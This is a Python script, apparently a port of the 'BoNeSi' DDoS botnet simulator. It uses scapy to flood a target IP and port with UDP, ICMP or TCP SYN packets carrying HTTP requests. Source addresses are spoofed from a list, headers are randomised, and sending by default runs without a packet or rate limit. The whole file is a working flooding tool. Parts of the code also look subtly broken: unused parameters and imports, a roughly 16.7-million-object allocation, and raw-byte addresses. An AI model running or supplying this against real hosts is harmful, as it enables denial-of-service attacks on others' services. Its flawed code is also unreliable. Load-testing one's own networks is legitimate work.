import argparse
import random
import time
import signal
import sys
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.sendrecv import send
from scapy.utils import rdpcap
from scapy.layers.http import HTTPRequest
import dpkt
import socket

STATS_SIZE = 60
WINDOW_SIZE = 4096
IP_ID = 0
TIMEOUT = 5
MIN_PORT = 10000
MAX_PORT = 35534

finishedCount = 0
resetCount = 0

class ConnectionStatus:
    NOT_CONNECTED = 0
    CONNECTING = 1
    ESTABLISHED = 2
    CLOSED = 3

class Connection:
    def __init__(self):
        self.status = ConnectionStatus.NOT_CONNECTED
        self.start_time = 0
        self.referer = -1
        self.useragent = -1
        self.url = -1
        self.payload_offset = 0

connections = [Connection() for _ in range(65536 * 256)]

def parse_args():
    parser = argparse.ArgumentParser(description="BoNeSi - DDoS Botnet Simulator")
    parser.add_argument("dst_ip_port", help="Destination IP and port in the format <dst_ip:port>")
    parser.add_argument("-i", "--ips", help="Filename with IP list")
    parser.add_argument("-p", "--protocol", choices=["udp", "icmp", "tcp"], default="udp", help="Protocol to use (default: udp)")
    parser.add_argument("-r", "--send_rate", type=int, default=0, help="Packets per second (default: 0 for infinite)")
    parser.add_argument("-s", "--payload_size", type=int, default=32, help="Size of the payload (default: 32)")
    parser.add_argument("-o", "--stats_file", default="stats", help="Filename for the statistics (default: 'stats')")
    parser.add_argument("-c", "--max_packets", type=int, default=0, help="Maximum number of packets (default: 0 for infinite)")
    parser.add_argument("--integer", action="store_true", help="IPs are integers in host byte order instead of dotted notation")
    parser.add_argument("-t", "--max_bots", type=int, default=0, help="Determine max_bots in the 24bit prefix randomly (1-256)")
    parser.add_argument("-u", "--url", help="The URL (only for tcp/http)")
    parser.add_argument("-l", "--url_list", help="Filename with URL list (only for tcp/http)")
    parser.add_argument("-b", "--useragent_list", help="Filename with useragent list (only for tcp/http)")
    parser.add_argument("-d", "--device", help="Network listening device (only for tcp/http)")
    parser.add_argument("-m", "--mtu", type=int, default=1500, help="Set MTU (default: 1500)")
    parser.add_argument("-f", "--frag", type=int, choices=[0, 1], default=0, help="Set fragmentation mode (0=IP, 1=TCP, default: 0)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Print additional debug messages")
    return parser.parse_args()

def build_ip(ip_size, src_ip, dst_ip, proto, payload):
    return IP(src=src_ip, dst=dst_ip, id=IP_ID, ttl=random.randint(3, 255), proto=proto) / payload

def send_packet(packet):
    send(packet, verbose=False)

def read_ips(filename, integer):
    ips = []
    with open(filename, "r") as file:
        for line in file:
            if integer:
                ips.append(int(line.strip()))
            else:
                ips.append(socket.inet_aton(line.strip()))
    return ips

def read_urls(filename):
    urls = []
    with open(filename, "r") as file:
        for line in file:
            urls.append(line.strip())
    return urls

def read_useragents(filename):
    useragents = []
    with open(filename, "r") as file:
        for line in file:
            useragents.append(line.strip())
    return useragents

def build_request(url, referer, useragent):
    request = f"GET /{url} HTTP/1.0\r\nHost: {url}\r\nUser-agent: {useragent}\r\n"
    request += "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n"
    request += "Accept-Language: en-us,en;q=0.5\r\n"
    request += "Accept-Encoding: gzip,deflate\r\n"
    request += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
    if referer:
        request += f"Referer: {referer}\r\n"
    request += "Connection: close\r\n\r\n"
    return request

def main():
    args = parse_args()
    dst_ip, dst_port = args.dst_ip_port.split(":")
    dst_port = int(dst_port)
    src_ips = read_ips(args.ips, args.integer) if args.ips else [socket.gethostbyname(socket.gethostname())]
    urls = read_urls(args.url_list) if args.url_list else [args.url] if args.url else ["www.google.com"]
    useragents = read_useragents(args.useragent_list) if args.useragent_list else ["Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)"]

    payload = b"\x00" * args.payload_size
    interval = 1.0 / args.send_rate if args.send_rate > 0 else 0
    cnt = 0
    ip_index = 0

    while not args.max_packets or cnt < args.max_packets:
        src_ip = src_ips[ip_index]
        src_port = random.randint(MIN_PORT, MAX_PORT)
        if args.protocol == "icmp":
            packet = build_ip(args.payload_size + 8, src_ip, dst_ip, 1, ICMP(type=8, id=0x42, seq=0x42) / payload)
        elif args.protocol == "tcp":
            request = build_request(random.choice(urls), random.choice(urls), random.choice(useragents))
            packet = build_ip(len(request) + 20, src_ip, dst_ip, 6, TCP(sport=src_port, dport=dst_port, flags="S", seq=random.randint(0, 2**32-1), window=WINDOW_SIZE) / request)
        else:
            packet = build_ip(args.payload_size + 8, src_ip, dst_ip, 17, UDP(sport=src_port, dport=dst_port) / payload)
        send_packet(packet)
        cnt += 1
        ip_index = (ip_index + 1) % len(src_ips)
        if interval > 0:
            time.sleep(interval)

if __name__ == "__main__":
    main()
